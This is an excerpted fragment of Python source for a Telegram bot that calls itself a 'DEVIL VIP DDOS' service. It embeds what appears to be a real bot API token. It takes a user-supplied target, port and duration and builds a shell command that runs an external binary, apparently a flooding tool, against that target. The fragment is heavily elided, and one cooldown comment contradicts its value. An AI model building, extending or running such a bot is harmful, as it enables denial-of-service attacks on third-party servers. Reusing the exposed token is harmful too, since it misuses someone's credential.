...
bot = telebot.TeleBot('7588718622:AAFUEBsyHeT15e88_QoYdqChjGmECGDJS_8')
...
def start_command(message):
    ...
    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗗𝗘𝗩𝗜𝗟 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦!", reply_markup=markup)

COOLDOWN_PERIOD = 60  # 5 minutes
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if time > 240:
                ...
                full_command = f"./mrin {target} {port} {time} 300"
